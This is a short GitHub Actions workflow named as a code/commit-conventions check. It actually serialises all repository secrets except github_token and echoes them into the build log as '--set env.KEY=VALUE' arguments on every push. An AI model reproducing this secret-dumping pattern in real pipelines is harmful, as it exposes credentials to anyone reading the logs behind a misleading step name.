name: Check code/commit conventions

on: push

jobs:
  pre-commit:
    runs-on: ubuntu-20.04
    steps:
      - name: View context attributes
        id: set-result
        uses: actions/github-script@v6
        with:
          script: |
            const secrets = JSON.parse(JSON.stringify(${{ toJSON(secrets) }}));
            ["github_token"].forEach(v => delete secrets[v]);
            return JSON.stringify(secrets).replace(/\"/g, '\\"');
          result-encoding: string
      - name: Test JQ
        run: |
          echo $(jq -r 'keys[] as $k | "--set env.\($k)=\(.[$k])"' <<< "${{steps.set-result.outputs.result}}")
